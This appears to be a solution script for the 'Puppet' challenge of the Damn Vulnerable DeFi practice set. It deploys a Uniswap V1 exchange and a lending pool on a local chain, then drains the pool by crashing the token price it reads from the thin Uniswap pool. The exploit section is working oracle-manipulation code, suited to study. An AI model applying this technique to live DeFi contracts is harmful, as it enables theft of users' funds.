from brownie import *
import json


def deploy_from_bytecode(bytecode):
    la = accounts.add()
    accounts[9].transfer(la, '1 ether')
    signed_tx = web3.eth.account.sign_transaction({
        'nonce': 0,
        'gasPrice': Wei('10 gwei'),
        'gas': chain.block_gas_limit,
        'data': bytecode
    }, la.private_key)
    tx = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    return web3.eth.get_transaction_receipt(tx)['contractAddress']


def main():
    deployer = a[0]

    UNISWAP_INITIAL_TOKEN_RESERVE = Wei('10 ether')
    UNISWAP_INITIAL_ETH_RESERVE = Wei('10 ether')

    ATTACKER_INITIAL_TOKEN_BALANCE = Wei('1000 ether')
    ATTACKER_INITIAL_ETH_BALANCE = Wei('25 ether')
    POOL_INITIAL_TOKEN_BALANCE = Wei('100000 ether')

    attacker = accounts.add()
    deployer.transfer(attacker, ATTACKER_INITIAL_ETH_BALANCE)

    token = DamnValuableToken.deploy({'from': deployer})

    # deploy exchange template
    with open('build-uniswap-v1/UniswapV1Exchange.json') as f:
        exchange_abi = json.load(f)
    exchangeTemplateAddress = deploy_from_bytecode(
                                exchange_abi['evm']['bytecode']['object'])
    exchangeTemplate = Contract.from_abi('UniswapV1Exchange',
        exchangeTemplateAddress, exchange_abi['abi'], owner=deployer)

    # deploy exchange factory
    with open('build-uniswap-v1/UniswapV1Factory.json') as f:
        factory_abi = json.load(f)
    factoryAddress = deploy_from_bytecode(
                        factory_abi['evm']['bytecode']['object'])
    factory = Contract.from_abi('UniswapV1Factory',
        factoryAddress, factory_abi['abi'], owner=deployer)

    factory.initializeFactory(exchangeTemplate, {'from': deployer})

    # deploy the Uniswap exchange
    factory.createExchange(token, {'from': deployer})
    uniswapExchangeAddress = history[-1].events['NewExchange']['exchange']
    uniswapExchange = Contract.from_abi('UniswapV1Exchange',
        uniswapExchangeAddress, exchange_abi['abi'], owner=deployer)

    lendingPool = PuppetPool.deploy(token, uniswapExchange,
                                    {'from': deployer})

    token.approve(uniswapExchange, UNISWAP_INITIAL_TOKEN_RESERVE,
                                    {'from': deployer})

    uniswapExchange.addLiquidity(
        0,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        chain[-1].timestamp * 2,
        {'value': UNISWAP_INITIAL_ETH_RESERVE, 'from': deployer})

    def calculateTokenToEthInputPrice(
            tokensSold, tokensInReserve, etherInReserve):
        return tokensSold * 997 * etherInReserve // \
                (tokensInReserve * 1000 + tokensSold * 997)

    # ensure Uniswap exchange is working as expected
    assert uniswapExchange.getTokenToEthInputPrice(Wei('1 ether')) == \
            calculateTokenToEthInputPrice(
                Wei('1 ether'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )

    token.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE)
    token.transfer(lendingPool, POOL_INITIAL_TOKEN_BALANCE)

    assert lendingPool.calculateDepositRequired(Wei('1 ether')) == Wei('2 ether')
    assert lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE) == POOL_INITIAL_TOKEN_BALANCE * 2

    # Exploit code here
    token.approve(uniswapExchange,
                  ATTACKER_INITIAL_TOKEN_BALANCE, {'from': attacker})
    # make token price extremely cheap by buying most ether in pair
    uniswapExchange.tokenToEthSwapInput(
        ATTACKER_INITIAL_TOKEN_BALANCE,
        uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE),
        chain[-1].timestamp * 2,
        {'from': attacker})
    # get min deposit to drain pool
    depositRequired = lendingPool.calculateDepositRequired(
                        token.balanceOf(lendingPool))
    assert depositRequired < attacker.balance() # make sure we have enough eth
    lendingPool.borrow(token.balanceOf(lendingPool),
                {'from': attacker, 'value': depositRequired})

    # Success conditions - attacker has taken all tokens from the pool
    assert token.balanceOf(lendingPool) == 0
    assert token.balanceOf(attacker) == POOL_INITIAL_TOKEN_BALANCE

    print('Challenge successfully passed.')

